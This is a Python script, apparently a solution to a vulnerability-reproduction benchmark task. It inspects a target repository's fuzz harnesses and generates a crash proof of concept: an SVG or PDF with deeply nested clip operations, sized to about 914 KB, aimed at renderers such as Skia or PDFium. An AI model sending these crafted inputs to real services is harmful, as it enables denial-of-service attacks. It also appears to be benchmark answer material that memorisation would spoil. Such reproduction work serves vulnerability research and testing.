import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


def _safe_decode(b: bytes) -> str:
    return b.decode("utf-8", errors="ignore")


def _iter_repo_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 600_000:
                    continue
                name_l = fn.lower()
                if not any(name_l.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".inl", ".rs", ".go", ".java", ".py", ".gn", ".gni", ".bazel", ".bzl", ".cmake", ".txt", "cmakelists.txt", "build", "build.bazel")):
                    continue
                try:
                    with open(p, "rb") as f:
                        yield p, f.read()
                except OSError:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > 600_000:
                    continue
                name_l = (m.name or "").lower()
                base_l = os.path.basename(name_l)
                if not any(base_l.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".inl", ".rs", ".go", ".java", ".py", ".gn", ".gni", ".bazel", ".bzl", ".cmake", ".txt", "cmakelists.txt")):
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                yield m.name, data
    except Exception:
        return


def _infer_format(src_path: str) -> str:
    scores: Dict[str, int] = {"svg": 0, "pdf": 0, "skp": 0, "json": 0, "xml": 0}
    path_hints: Dict[str, int] = {"svg": 0, "pdf": 0, "skp": 0, "json": 0, "xml": 0}

    max_scan_files = 2000
    max_total_bytes = 12_000_000
    scanned_files = 0
    total_bytes = 0

    repo_paths: List[str] = []

    for path, data in _iter_repo_files(src_path):
        repo_paths.append(path.lower())
        scanned_files += 1
        total_bytes += len(data)
        if scanned_files > max_scan_files or total_bytes > max_total_bytes:
            break

        p = path.lower()
        if "svg" in p:
            path_hints["svg"] += 2
        if "pdf" in p:
            path_hints["pdf"] += 2
        if "skp" in p or "picture" in p:
            path_hints["skp"] += 1
        if "json" in p or "lottie" in p:
            path_hints["json"] += 1
        if "xml" in p:
            path_hints["xml"] += 1

        if not (("fuzz" in p) or ("fuzzer" in p) or (b"LLVMFuzzerTestOneInput" in data) or (b"FuzzerTestOneInput" in data)):
            continue

        s = _safe_decode(data)
        sl = s.lower()

        if "llvmfuzzertestoneinput" in sl or "fuzzertestoneinput" in sl:
            if "sksvgdom" in s or "sk_svg" in sl or ".svg" in sl or "<svg" in sl or "clip-path" in sl:
                scores["svg"] += 25
            if "fpdf" in sl or "cpdf" in sl or "pdfium" in sl or ".pdf" in sl or "pdf" in sl and ("load" in sl or "parser" in sl or "document" in sl):
                scores["pdf"] += 20
            if "skpicture" in s or ".skp" in sl or "makefromstream" in sl and "picture" in sl:
                scores["skp"] += 20
            if "nlohmann::json" in s or "rapidjson" in sl or ".json" in sl or "lottie" in sl or "skottie" in sl:
                scores["json"] += 15
            if "xml" in sl and ("parse" in sl or "document" in sl):
                scores["xml"] += 5

        if "skia" in sl:
            if "modules/svg" in sl or "sksvg" in sl:
                scores["svg"] += 10
            if "pdf" in sl:
                scores["pdf"] += 7
            if "skp" in sl or "picture" in sl:
                scores["skp"] += 7

    for p in repo_paths[:5000]:
        if "librsvg" in p or "resvg" in p or "usvg" in p or "svg" in p:
            path_hints["svg"] += 1
        if "pdfium" in p or "mupdf" in p:
            path_hints["pdf"] += 2
        if "skia" in p:
            path_hints["skp"] += 1
            path_hints["svg"] += 1
            path_hints["pdf"] += 1

    combined: Dict[str, int] = {}
    for k in scores:
        combined[k] = scores[k] + path_hints[k]

    best = max(combined.items(), key=lambda kv: kv[1])[0]
    if combined[best] <= 0:
        return "svg"
    if best == "xml":
        return "svg"
    return best


def _gen_svg_deep_clip(target_len: int, min_levels: int = 1024) -> bytes:
    prefix = (
        b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">'
        b"<defs>"
        b'<clipPath id="c"><rect x="0" y="0" width="1" height="1"/></clipPath>'
        b"</defs>"
    )
    open_tag = b'<g clip-path="url(#c)">'
    close_tag = b"</g>"
    payload = b'<rect x="0" y="0" width="1" height="1"/>'
    suffix = b"</svg>"

    fixed = len(prefix) + len(payload) + len(suffix)
    per = len(open_tag) + len(close_tag)
    if target_len <= fixed + per * min_levels:
        levels = min_levels
    else:
        levels = (target_len - fixed) // per
        if levels < min_levels:
            levels = min_levels

    body = open_tag * levels + payload + close_tag * levels
    out = prefix + body + suffix

    if len(out) < target_len:
        pad_len = min(target_len - len(out), 10_000)
        if pad_len > 0:
            out += b"<!--" + (b"A" * max(0, pad_len - 7)) + b"-->"
    elif len(out) > target_len and levels > min_levels:
        excess = len(out) - target_len
        cut_levels = min(levels - min_levels, (excess + per - 1) // per)
        if cut_levels > 0:
            levels2 = levels - cut_levels
            body2 = open_tag * levels2 + payload + close_tag * levels2
            out2 = prefix + body2 + suffix
            if len(out2) <= len(out):
                out = out2

    return out


def _build_pdf_with_content(content: bytes) -> bytes:
    header = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"

    def obj(n: int, body: bytes) -> bytes:
        return f"{n} 0 obj\n".encode("ascii") + body + b"\nendobj\n"

    obj1 = obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    obj2 = obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    obj3 = obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R /Resources << >> >>")
    stream_dict = b"<< /Length " + str(len(content)).encode("ascii") + b" >>\nstream\n" + content + b"\nendstream"
    obj4 = obj(4, stream_dict)

    parts = [header, obj1, obj2, obj3, obj4]
    offsets = []
    cur = 0
    for part in parts:
        if part is header:
            cur += len(part)
            continue
        offsets.append(cur)
        cur += len(part)

    xref_start = cur
    xref = [b"xref\n0 5\n0000000000 65535 f \n"]
    for off in offsets:
        xref.append(f"{off:010d} 00000 n \n".encode("ascii"))
    trailer = b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n" + str(xref_start).encode("ascii") + b"\n%%EOF\n"
    return b"".join(parts) + b"".join(xref) + trailer


def _gen_pdf_deep_clip(target_len: int) -> bytes:
    per_level = b"q 0 0 1 1 re W n\n"
    restore = b"Q\n"
    final_paint = b"0 g 0 0 1 1 re f\n"

    def build_for_levels(n: int) -> bytes:
        content = per_level * n + final_paint + restore * n
        return _build_pdf_with_content(content)

    low, high = 1, 200000
    best = build_for_levels(low)
    if len(best) > target_len:
        return best

    while True:
        cand = build_for_levels(high)
        if len(cand) >= target_len or high >= 300000:
            break
        high *= 2

    lo, hi = low, high
    best = build_for_levels(lo)
    while lo <= hi:
        mid = (lo + hi) // 2
        cand = build_for_levels(mid)
        if len(cand) <= target_len:
            best = cand
            lo = mid + 1
        else:
            hi = mid - 1

    if len(best) < target_len:
        pad = min(target_len - len(best), 8000)
        if pad > 0:
            best += b"\n%PAD" + (b"A" * max(0, pad - 5))

    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_len = 913_919
        fmt = _infer_format(src_path)

        if fmt == "pdf":
            return _gen_pdf_deep_clip(target_len)
        if fmt == "json":
            # Fallback to SVG since the described bug is clip/layer nesting related.
            return _gen_svg_deep_clip(target_len)
        if fmt == "skp":
            # Can't reliably craft SKP without skia tooling; SVG is the best generic deep-clip trigger.
            return _gen_svg_deep_clip(target_len)
        return _gen_svg_deep_clip(target_len)